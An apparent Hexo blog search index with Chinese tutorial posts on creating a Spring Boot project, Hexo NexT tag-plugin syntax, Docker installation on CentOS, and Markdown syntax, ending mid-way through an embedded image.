<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>SpringBoot快速入门</title>
    <url>/posts/2197/</url>
    <content><![CDATA[<h2 id="新建项目">新建项目</h2>
<ol type="1">
<li><p>打开IDEA新建一个项目，选择Spring Initializr，保持默认选项，点击Next</p>
<p><img data-src="https://img.hujinbo.me/blog/20190624231319.png" /><span id="more"></span></p></li>
<li><p>填写Maven GroupID、ArtifactID、Version等名称后，点击Next</p>
<p><img data-src="https://img.hujinbo.me/blog/20190624232042.png" /></p></li>
<li><p>勾选Spring Web Starter，并选择Spring Boot版本（<code>SNAPSHOT</code>是快照版本，建议选择<code>RELEASE</code>版本）</p>
<p><img data-src="https://img.hujinbo.me/blog/20190624233350.png" /></p></li>
<li><p>填写项目名称和路径，路径最好不要包含中文名和空格，点击Finish后，在弹出的提示框中点击OK</p>
<p><img data-src="https://img.hujinbo.me/blog/20190624233612.png" /></p></li>
<li><p>此时项目已经新建完成，等待下载Maven依赖后运行项目即可</p>
<p><img data-src="https://img.hujinbo.me/blog/20190624234542.png" /></p></li>
<li><p>删除没用的文件</p>
<p><img data-src="https://img.hujinbo.me/blog/20190625000508.png" /></p></li>
</ol>
<p><strong>注</strong>：以上是通过IDEA创建，也可以通过https://start.spring.io/生成项目后下载到本地。</p>
]]></content>
      <categories>
        <category>SpringBoot</category>
      </categories>
      <tags>
        <tag>SpringBoot</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo标签插件常用语法介绍</title>
    <url>/posts/32268/</url>
    <content><![CDATA[<blockquote>
<p>标签插件（Tag Plugins）是Hexo提供的一种快速生成特定内容的插件，以下标签是Next主题提供的标签：</p>
</blockquote>
<h2 id="居中引用">居中引用</h2>
<p>用于文章开篇引用或者结束语之前的总结引用：</p>
<pre><code>&#123;% cq %&#125;你所做的事情，也许暂时看不到成功，但不要灰心，你不是没有成长，而是在扎根。&#123;% endcq %&#125;</code></pre>
<p>显示效果如下所示：</p>
<blockquote class="blockquote-center">
            <i class="fa fa-quote-left"></i>
            <p>你所做的事情，也许暂时看不到成功，但不要灰心，你不是没有成长，而是在扎根。</p>

            <i class="fa fa-quote-right"></i>
          </blockquote>
<span id="more"></span>
<h2 id="插入按钮">插入按钮</h2>
<figure class="highlight md"><table><tr><td class="code"><pre><span class="line">语法：&#123;% btn url, text, icon [class], [title] %&#125;</span><br><span class="line"></span><br><span class="line">url     : URL地址</span><br><span class="line">text    : 按钮文字，未指定图标时为必填</span><br><span class="line">icon    : FontAwesome图标名称（开头没有&#x27;fa-&#x27;），未指定文字时为必填</span><br><span class="line">[class] : FontAwesome样式名称，如：fa-fw | fa-lg | fa-2x | fa-3x | fa-4x | fa-5x</span><br><span class="line">[title] : 鼠标悬停时的提示</span><br><span class="line"></span><br><span class="line">示例：&#123;% btn https://hujinbo.me, 博客主页, home fa-fw, 点击跳转我的博客主页 %&#125;</span><br></pre></td></tr></table></figure>
<p>显示效果如下所示：</p>
<a class="btn" href="https://hujinbo.me" title="点击跳转我的博客主页">
            <i class="fa fa-home fa-fw"></i>博客主页
          </a>
<h2 id="颜色标签">颜色标签</h2>
<figure class="highlight md"><table><tr><td class="code"><pre><span class="line">语法：&#123;% label [class]@Text %&#125;</span><br><span class="line"></span><br><span class="line">[class] : default | primary | success | info | warning | danger</span><br><span class="line"></span><br><span class="line">示例：&#123;% label warning@你好 %&#125;</span><br></pre></td></tr></table></figure>
<p>显示效果如下所示：</p>
<span class="label warning">你好</span>
<h2 id="提示标签">提示标签</h2>
<p>在博客中使用Bootstrap Callout，主要用于提示信息：</p>
<figure class="highlight md"><table><tr><td class="code"><pre><span class="line">语法：&#123;% note [class] [no-icon] %&#125;内容&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">[class]   : default | primary | success | info | warning | danger</span><br><span class="line">[no-icon] : 禁用图标</span><br><span class="line"></span><br><span class="line">示例：</span><br><span class="line">&#123;% note warning %&#125;</span><br><span class="line">注：更多详细内容，请阅读<span class="strong">**[<span class="string">官方文档</span>](<span class="link">https://theme-next.org/docs/tag-plugins/note</span>)**</span></span><br><span class="line">&#123;% endnote %&#125;</span><br></pre></td></tr></table></figure>
<p>显示效果如下所示：</p>
<div class="note warning">
            <p>注：更多详细内容，请阅读<strong><span class="exturl" data-url="aHR0cHM6Ly90aGVtZS1uZXh0Lm9yZy9kb2NzL3RhZy1wbHVnaW5zL25vdGU=">官方文档<i class="fa fa-external-link-alt"></i></span></strong></p>
          </div>
<h2 id="tab标签">Tab标签</h2>
<figure class="highlight md"><table><tr><td class="code"><pre><span class="line">语法：</span><br><span class="line">&#123;% tabs Unique name, [index] %&#125;</span><br><span class="line">&lt;!-- tab [Tab caption] [@icon] --&gt;</span><br><span class="line">标签内容</span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line">&#123;% endtabs %&#125;</span><br><span class="line"></span><br><span class="line">Unique name   : 标签唯一标识名称。该名称将作为id前缀，故应使用英文名称，且保证在当前文章/页面唯一，不能含有逗号。</span><br><span class="line">[index]       : 激活的标签索引数值。不指定时默认选中第1个标签；当值为-1时，不会选中任何标签。</span><br><span class="line">[Tab caption] : 标签标题名称。如果没有指定标题，将使用 唯一标识名称+索引 作为当前标题名称；没有指定标题但设置了图标，则标题为空。</span><br><span class="line">[@icon]       : FontAwesome图标名称（开头没有&#x27;fa-&#x27;）</span><br><span class="line"><span class="code">                </span></span><br><span class="line"><span class="code">示例：</span></span><br><span class="line"><span class="code">&#123;% tabs demo1, 2 %&#125;</span></span><br><span class="line"><span class="code">&lt;!-- tab 标签1 @home --&gt;</span></span><br><span class="line"><span class="code">标签1内容</span></span><br><span class="line"><span class="code">&lt;!-- endtab --&gt;</span></span><br><span class="line"><span class="code"></span></span><br><span class="line">&lt;!-- tab 标签2@archive --&gt;</span><br><span class="line">标签2内容</span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- tab 标签3 @th --&gt;</span><br><span class="line">标签3内容</span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line">&#123;% endtabs %&#125;</span><br></pre></td></tr></table></figure>
<p>显示效果如下所示：</p>
<div class="tabs" id="demo1"><ul class="nav-tabs"><li class="tab"><a href="#demo1-1"><i class="fa fa-home"></i>标签1</a></li><li class="tab active"><a href="#demo1-2"><i class="fa fa-archive"></i>标签2</a></li><li class="tab"><a href="#demo1-3"><i class="fa fa-th"></i>标签3</a></li></ul><div class="tab-content"><div class="tab-pane" id="demo1-1"><p>标签1内容</p></div><div class="tab-pane active" id="demo1-2"><p>标签2内容</p></div><div class="tab-pane" id="demo1-3"><p>标签3内容</p></div></div></div>
<h2 id="插入组图">插入组图</h2>
<figure class="highlight md"><table><tr><td class="code"><pre><span class="line">语法：&#123;% gp [group]-[layout] %&#125;&#123;% endgp %&#125;</span><br><span class="line"></span><br><span class="line">[group]  : 要在组中添加的图片总数</span><br><span class="line">[layout] : 在分组下默认显示的图片</span><br><span class="line"></span><br><span class="line">示例：</span><br><span class="line">&#123;% gp 4-2 %&#125;</span><br><span class="line">  ![](/images/favicon-16x16.png)</span><br><span class="line">  ![](/images/favicon-32x32.png)</span><br><span class="line">  ![](/images/favicon-16x16.png)</span><br><span class="line">  ![](/images/favicon-32x32.png)</span><br><span class="line">&#123;% endgp %&#125;</span><br></pre></td></tr></table></figure>
<p>显示效果如下所示：</p>
<div class="group-picture"><div class="group-picture-container"><div class="group-picture-row"><div class="group-picture-column" style="width: 100%;"><img data-src="/images/favicon-16x16.png" /></div></div><div class="group-picture-row"><div class="group-picture-column" style="width: 33.333333333333336%;"><img data-src="/images/favicon-32x32.png" /></div><div class="group-picture-column" style="width: 33.333333333333336%;"><img data-src="/images/favicon-16x16.png" /></div><div class="group-picture-column" style="width: 33.333333333333336%;"><img data-src="/images/favicon-32x32.png" /></div></div></div></div>
<h2 id="插入视频">插入视频</h2>
<pre><code>&#123;% video https://cdn.hujinbo.me/video/demo.mp4 %&#125;</code></pre>
<p>显示效果如下所示：</p>
<video src="https://cdn.hujinbo.me/video/demo.mp4" preload="metadata" controls playsinline poster="">Sorry, your browser does not support the video tag.</video>
<h2 id="插入pdf">插入PDF</h2>
<figure class="highlight md"><table><tr><td class="code"><pre><span class="line">语法：&#123;% pdf url [height] %&#125;</span><br><span class="line"></span><br><span class="line">[url]    : URL地址</span><br><span class="line">[height] : 显示高度</span><br><span class="line"></span><br><span class="line">示例：&#123;% pdf https://cdn.hujinbo.me/pdf/demo.pdf 790px %&#125;</span><br></pre></td></tr></table></figure>
<p>显示效果如下所示：</p>
<div class="pdfobject-container" data-target="https://cdn.hujinbo.me/pdf/demo.pdf" data-height="790px"></div>
<h2 id="流程图">流程图</h2>
<p>用类似Markdown语法的方式生成流程图，详见<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2tuc3YvbWVybWFpZA==">mermaid官方文档<i class="fa fa-external-link-alt"></i></span></p>
<figure class="highlight md"><table><tr><td class="code"><pre><span class="line">语法：&#123;% mermaid type %&#125;&#123;% endmermaid %&#125;</span><br><span class="line"></span><br><span class="line">type : mermaid图表类型</span><br></pre></td></tr></table></figure>
<h3 id="流程图-1">流程图</h3>
<figure class="highlight md"><table><tr><td class="code"><pre><span class="line">&#123;% mermaid graph LR %&#125;</span><br><span class="line">ST[开始]--&gt;A</span><br><span class="line">A[用户管理]--&gt;B&#123;是否注册&#125;</span><br><span class="line">B--&gt;|是|B1(输入用户名密码)</span><br><span class="line">B--&gt;|否|B2(注册)</span><br><span class="line">B1--&gt;C[登录]</span><br><span class="line">C--&gt;D[完善个人信息]</span><br><span class="line">B2--&gt;E[注册完成]</span><br><span class="line">E--&gt;B</span><br><span class="line">E--&gt;END[结束]</span><br><span class="line">&#123;% endmermaid %&#125;</span><br></pre></td></tr></table></figure>
<p>显示效果如下所示：</p>
<pre class="mermaid" style="text-align: center;">
            graph LR
            ST[开始]-->A
A[用户管理]-->B{是否注册}
B-->|是|B1(输入用户名密码)
B-->|否|B2(注册)
B1-->C[登录]
C-->D[完善个人信息]
B2-->E[注册完成]
E-->B
E-->END[结束]
          </pre>
<h3 id="时序图">时序图</h3>
<figure class="highlight md"><table><tr><td class="code"><pre><span class="line">&#123;% mermaid sequenceDiagram %&#125;</span><br><span class="line">participant A as 客户</span><br><span class="line">participant B as 取款机</span><br><span class="line">participant C as 银行</span><br><span class="line">A-&gt;&gt;B: 请求取款</span><br><span class="line">B-&gt;&gt;C: 取款请求</span><br><span class="line">Note right of C: 处理请求...</span><br><span class="line">C--&gt;&gt;B: 请求结果</span><br><span class="line">B--&gt;&gt;A: 请求结果</span><br><span class="line">&#123;% endmermaid %&#125;</span><br></pre></td></tr></table></figure>
<p>显示效果如下所示：</p>
<pre class="mermaid" style="text-align: center;">
            sequenceDiagram
            participant A as 客户
participant B as 取款机
participant C as 银行
A->>B: 请求取款
B->>C: 取款请求
Note right of C: 处理请求...
C-->>B: 请求结果
B-->>A: 请求结果
          </pre>
<h3 id="甘特图">甘特图</h3>
<figure class="highlight md"><table><tr><td class="code"><pre><span class="line">&#123;% mermaid gantt %&#125;</span><br><span class="line">title 项目进度规划表</span><br><span class="line">dateFormat YYYY-MM-DD</span><br><span class="line">section 前期</span><br><span class="line">需求分析:2019-04-11, 8d</span><br><span class="line">section 中期</span><br><span class="line">编码开发:2019-04-19, 15d</span><br><span class="line">section 后期</span><br><span class="line">系统测试:2019-04-26, 15d</span><br><span class="line">&#123;% endmermaid %&#125;</span><br></pre></td></tr></table></figure>
<p>显示效果如下所示：</p>
<pre class="mermaid" style="text-align: center;">
            gantt
            title 项目进度规划表
dateFormat YYYY-MM-DD
section 前期
需求分析:2019-04-11, 8d
section 中期
编码开发:2019-04-19, 15d
section 后期
系统测试:2019-04-26, 15d
          </pre>
<h2 id="数学公式">数学公式</h2>
<p>使用 <code>\tag&#123;&#125;</code> 给公式编号:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$$\begin&#123;equation&#125; \tag&#123;a&#125; \label&#123;eq1&#125;</span><br><span class="line">e=mc^2</span><br><span class="line">\end&#123;equation&#125;$$</span><br></pre></td></tr></table></figure>
<p>显示效果如下所示：</p>
<p><span class="math display">\[\begin{equation} \tag{a} \label{eq1}
e=mc^2
\end{equation}\]</span></p>
<p>使用 <code>\eqref&#123;&#125;</code> 引用公式：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">质能方程 $\eqref&#123;eq1&#125;$ 是爱因斯坦提出的</span><br></pre></td></tr></table></figure>
<p>显示效果如下所示：</p>
<p>质能方程 <span class="math inline">\(\eqref{eq1}\)</span> 是爱因斯坦提出的</p>
]]></content>
      <categories>
        <category>博客教程</category>
      </categories>
      <tags>
        <tag>Tag Plugins</tag>
      </tags>
  </entry>
  <entry>
    <title>Docker环境搭建</title>
    <url>/posts/47824/</url>
    <content><![CDATA[<h2 id="linux-docker-安装">Linux Docker 安装</h2>
<ol type="1">
<li><p>卸载旧版本Docker：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo yum remove docker \</span><br><span class="line">                docker-client \</span><br><span class="line">                docker-client-latest \</span><br><span class="line">                docker-common \</span><br><span class="line">                docker-latest \</span><br><span class="line">                docker-latest-logrotate \</span><br><span class="line">                docker-logrotate \</span><br><span class="line">                docker-engine</span><br></pre></td></tr></table></figure></li>
<li><p>安装Dokcer所需的一些系统工具：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo yum install -y yum-utils device-mapper-persistent-data lvm2</span><br></pre></td></tr></table></figure></li>
</ol>
<span id="more"></span>
<ol start="3" type="1">
<li><p>添加Dokcer软件源（使用阿里云国内镜像源，解决下载慢问题），并更新yum缓存：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo yum-config-manager --add-repo http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo</span><br><span class="line">sudo yum makecache fast</span><br></pre></td></tr></table></figure></li>
<li><p>安装最新版Docker：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo yum -y install docker-ce docker-ce-cli containerd.io</span><br></pre></td></tr></table></figure></li>
<li><p>启动Docker：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo systemctl start docker</span><br></pre></td></tr></table></figure></li>
<li><p>配置镜像加速器，可解决国内拉取Docker镜像慢问题。打开阿里云<span class="exturl" data-url="aHR0cHM6Ly9jci5jb25zb2xlLmFsaXl1bi5jb20vY24tc2hlbnpoZW4vaW5zdGFuY2VzL21pcnJvcnM=">容器镜像服务-镜像加速器<i class="fa fa-external-link-alt"></i></span>获取你的专属加速地址，替换下方<code>https://xxxxxxxx.mirror.aliyuncs.com</code>：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo mkdir -p /etc/docker</span><br><span class="line">sudo tee /etc/docker/daemon.json &lt;&lt;-<span class="string">&#x27;EOF&#x27;</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;registry-mirrors&quot;</span>: [<span class="string">&quot;https://xxxxxxxx.mirror.aliyuncs.com&quot;</span>]</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br><span class="line">sudo systemctl daemon-reload</span><br><span class="line">sudo systemctl restart docker</span><br></pre></td></tr></table></figure></li>
<li><p>运行<code>sudo docker run hello-world</code>，出现如下内容表示安装成功：</p>
<p><img data-src="https://img.hujinbo.me/blog/20191108222449.png" /></p></li>
<li><p>运行<code>sudo docker version</code>，可查看当前安装的docker版本：</p>
<p><img data-src="https://img.hujinbo.me/blog/20191108222254.png" /></p></li>
</ol>
<div class="note warning">
            <p>注：更多详细内容，请阅读<strong><span class="exturl" data-url="aHR0cHM6Ly9kb2NzLmRvY2tlci5jb20vaW5zdGFsbC9saW51eC9kb2NrZXItY2UvY2VudG9zLw==">官方文档<i class="fa fa-external-link-alt"></i></span></strong></p>
          </div>
]]></content>
      <categories>
        <category>Docker</category>
      </categories>
      <tags>
        <tag>Docker</tag>
      </tags>
  </entry>
  <entry>
    <title>Markdown常用语法介绍</title>
    <url>/posts/26028/</url>
    <content><![CDATA[<blockquote>
<p>Markdown是一种可以使用普通文本编辑器编写的标记语言，通过简单的标记语法，它可以使普通文本内容具有一定的格式。</p>
</blockquote>
<p>Markdown被广泛应用于编写开发文档、帮助文档、Wiki等，它可以很方便的进行版本管理，一些技术社区和写作平台也都支持Markdown，如：GitHub、简书、Hexo博客等，下面我们介绍一些Markdown的常用语法：</p>
<h2 id="标题格式">标题格式</h2>
<p>使用#号标记，1个#号代表一级标题，最大支持六级标题：</p>
<pre><code># 一级标题
## 二级标题
### 三级标题
#### 四级标题
##### 五级标题
###### 六级标题</code></pre>
<span id="more"></span>
<p>显示效果如下所示：</p>
<p><img style="border:none;margin:0" data-src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAFsAAAEqCAYAAAB6PyxJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAABhtSURBVHhe7Z2HjxxF04e/fxKBEVlkkZPAQmByECKJbJLIOeccjUkmB5FFNjlnsa+e+XhWde3ZcOfbYk/UTyrtbs9MT/fT1dU9Z035/walNKXB/uuvvwY//vjj4O+///6nZPNFXdT53XffLXvds1Aa7I8//niw6667Dg488MDB+vXrO/i//PJLB2oa64P522+/DY4//vjBFlts0X3yG1H3999/31tPn/3www/Duj/88MPBJZdcMtKuvPLKwaeffjp4+eWXB88999xE41yVApuO3HTTTR0U7K677urKL7jggmHZJIsw1SjYH3zwwWCnnXbapI5Rtt9++3XQ0Ysvvth7jka9nMM1fcdbs68oBfaXX3452GeffbqbH3bYYZ0noXmGvfXWWw/OOOOMoUeffPLJXTn1vv7664Prr79+eOyII47ovQZjBqgU2LfcckvXmC233HKwbt26Dso333wzeOyxx7rG0UiOH3DAAQsaunr16q4cO/XUUwd//PFHV9+3337bTVHqOuSQQ7rjfPL7zTffHGzcuLGb7rGucQY4QhoSNlBfffXVYah58sknh+UMZtTFF1/cHdtrr70GX3zxxT+lm2rmsLk5jaAxp512WgeMqbXVVlsNLrzwwq5zeiGeruj8UUcd1ZUzGM8///w/R8ZP9b4ZsBiNqxsTNo7CQF100UXD/rEmrV27djiId99999BB0Exhs1BxUxv53nvvLYDP59NPPz2EHUEBV49vAWbAHhdGgD1NCGzbMlPYTOltttmmuzGfxO3ddtut+01IefjhhxfEVzyDXQvecMopp3Rlq1atGjzyyCPdVGaHwQAaRrh+l1126c4zjDB4a9asGey7776LsnPOOacDI2zaNC6MCHuPPfboZqiDghnDU2Gz7dl99927G7eGp9CQCBsjxNC5vtXejqoXXnihGzSO2bFR104yr582jAib61h/XDDZOtIHj20CG0+adt84rREyqJeFDW/ec889h2DwYI4j7ms5RpxmkCbBxsPPPffc4bFjjz128Ouvv242bHYafZ6vsWgz+yLszz//fHhPBmss7KU2cJzFxS7uswFLY3yIIDbH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